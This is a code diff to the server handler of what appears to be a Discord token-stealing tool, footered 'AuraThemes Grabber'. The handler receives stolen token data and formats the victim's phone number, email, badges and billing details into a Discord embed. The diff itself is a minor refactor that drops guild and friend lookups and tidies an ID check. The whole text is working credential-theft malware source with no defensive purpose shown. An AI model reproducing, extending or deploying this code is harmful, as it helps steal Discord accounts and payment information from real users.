@@ -32,9 +32,7 @@ export default async function handler(req, res) {
     console.log(info);
 
     const Discord = new DiscordToken(data).info;
-    const guilds = new DiscordToken(data).guilds.rares;
-    const friends = new DiscordToken(data).friends.rares;
-    const embedBuilder = (Discord?.ID || Discord.ID) 
+    const embedBuilder = Discord?.ID
       ? buildInitializedEmbed(Discord, data, embed)
       : buildRawEmbed(data, embed);
 
@@ -82,7 +80,7 @@ function buildInitializedEmbed(Discord, data, embed) {
       getField('<a:aura:863691953531125820> Phone', `\`${Discord.phone}\``, true),
       getField('<:aura:974711605927505990> Email', `\`${Discord.mail}\``, false),
       getField('Badges', Discord.badges, true),
-      getField('Billing', Discord.billing, true),
+      getField('Billing', Discord.billing, true)
     )
     .setFooter({ text: 'AuraThemes Grabber', iconURL: embed.footericon })
     .setTimestamp();
